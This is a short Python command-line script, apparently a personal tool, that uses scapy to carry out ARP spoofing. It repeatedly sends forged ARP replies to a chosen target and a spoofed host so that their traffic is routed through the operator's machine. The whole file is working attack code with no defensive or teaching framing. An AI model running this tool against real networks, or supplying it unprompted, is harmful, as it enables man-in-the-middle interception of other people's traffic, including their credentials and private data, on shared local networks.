#!/usr/bin/env python3

from scapy.all import *
import argparse
import socket
import getmac
import os
import colors

#colors
color = colors.Color()
start = color.START
noefect = color.NO_EFFECT
back = color.B_NONE
green = start+noefect+color.T_GREEN+back
cyan = start+noefect+color.T_CYAN+back
red = start+noefect+color.T_RED+back
green = start+noefect+color.T_GREEN+back
end = color.END

arg = argparse.ArgumentParser(description="ARP-SPOOF")
arg.add_argument('--mac', type=str, help="Set you'r mac address")
arg.add_argument('--spoof', type=str, help="Set spoof address")
arg.add_argument('--target', type=str, help="Set target address")
arg.add_argument('--count', type=int, help="How many send packets", default=100)
args = arg.parse_args()

target = args.target
spoof = args.spoof
mac_spoof = getmac.get_mac_address(ip=spoof)
my_mac = args.mac
count = args.count
mac_target = getmac.get_mac_address(ip=target)

pack_count = 0

conf.verb=0
os.system("cls")

try:

    while True:
        
        pack_1 = ARP(hwsrc=my_mac,psrc=spoof,hwdst=mac_target,pdst=target)
        send(pack_1)

        print(green+"COUNT:"+end,cyan+str(pack_count)+end,"ME:",spoof,my_mac,green+"TARGET:"+end,target,mac_target)

        pack_2 = ARP(hwsrc=my_mac,psrc=target,hwdst=mac_spoof,pdst=spoof)
        send(pack_2)

        print(green+"COUNT:"+end,cyan+str(pack_count)+end,"ME:",target,my_mac,green+"TARGET:"+end,spoof,mac_spoof)
        
        pack_count += 1

        if pack_count == count:
            break

except PermissionError:
    print(red+"\n[+] You must be a root!"+end)
    print(green+"[+] EXIT"+end)
    exit()

except KeyboardInterrupt:
    print(green+"\n[+] EXIT"+end)
    exit()
